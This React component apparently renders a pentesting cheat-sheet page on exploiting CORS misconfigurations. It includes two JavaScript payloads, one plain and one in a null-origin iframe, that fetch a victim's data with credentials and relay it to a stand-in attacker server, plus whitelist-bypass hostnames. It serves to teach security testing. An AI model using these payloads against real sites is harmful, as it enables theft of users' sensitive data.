import React, {useState, useEffect} from 'react';
import Modal from 'react-modal';

const Cors = props => {

    return (
        <div className="container mt-2">
            <div className="row">
                <div className="col-12">
                    <p><b>Summary:</b> CORS is used to control what resources outside pages can access from a specific FQDN.  If misconfigured, an attacker can build a malicous webpage that uses JavaScript to access sensitive data and relay that data (via GET request) to the attacker's server.  The sensitive data can then be read in the logs of the attacker's server.</p>
                    <p><b>Goal(s):</b></p>
                    <ol>
                        <li>Access sensitive data by building a malicious webpage that sends a request using the victim's cookie to a vulnerable application.</li>
                    </ol>
                    <p><b>Methodology - Identifying Vulnerabilities:</b></p>
                    <ol>
                        <li>Arbitrary "Origin" header is reflected in the "Access-Control-Allow-Origin" response header, along with "Access-Control-Allow-Credentials: True"</li>
                        <li>Application compares "Origin" header to whitelist of FQDNs.  If the check against the whitelist is not implemented properly, the attacker can craft a malicious "Origin" header to bypass this control.:</li>

                        <li>Application has whitelisted an "Origin: null" header, allowing the attacker to build a webpage containing a malicious iFrame that will force the victim to access sensitive data and relay that data to the attacker's server.</li>
                    </ol>
                    <p><b>Methodology - Exploiting Vulnerabilities:</b></p>
                    <ol>
                        <li>Arbitrary "Origin" header:</li>
                        <p> var req = new XMLHttpRequest();
                            req.onload = reqListener;
                            req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
                            req.withCredentials = true;
                            req.send();

                            function reqListener() &#10100;
                            location='//malicious-website.com/log?key='+this.responseText;
                            &#10101;;</p>
                        <li>Test possible whitelist misconfigurations.  Example - "safe.com" is whitelisted:</li>
                        <ul>
                            <li>evilsafe.com</li>
                            <li>safe.com.evil.com</li>
                        </ul>
                        <li>Application has whitelisted an "Origin: null" header:</li>
                        <p>&#60;iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,&#60;script&#62;
                            var req = new XMLHttpRequest();
                            req.onload = reqListener;
                            req.open('get','vulnerable-website.com/sensitive-victim-data',true);
                            req.withCredentials = true;
                            req.send();

                            function reqListener() &#10100;
                            location='malicious-website.com/log?key='+this.responseText;
                            &#10101;;
                            &#60;/script&#62;"&#62;&#60;/iframe&#62;</p>
                    </ol>
                </div>
            </div>
        </div>
    );

}

export default Cors;